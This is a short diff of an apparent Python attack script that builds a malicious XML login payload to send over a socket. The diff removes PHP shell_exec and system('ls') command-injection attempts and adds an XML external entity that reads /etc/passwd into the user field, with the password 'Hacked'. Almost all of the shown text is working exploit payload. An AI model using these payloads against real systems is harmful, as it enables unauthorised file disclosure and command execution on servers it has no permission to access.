@@ -2,15 +2,12 @@ import socket
 server=socket.socket()
 file='''<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE login [
-<!ELEMENT login (user,pass)>
-<!ELEMENT user (#PCDATA)>
-<!ELEMENT pass (CDATA)>
-<!ENTITY gathering "<?php echo shell_exec('ls') ?>">
+<!ENTITY gathering SYSTEM "file:///etc/passwd">
 ]>
 
 <login>
-<user>hi</user>
-<pass>',"));system("ls") ;//></pass>
+<user>&gathering;</user>
+<pass>Hacked</pass>
 </login>
 
 '''
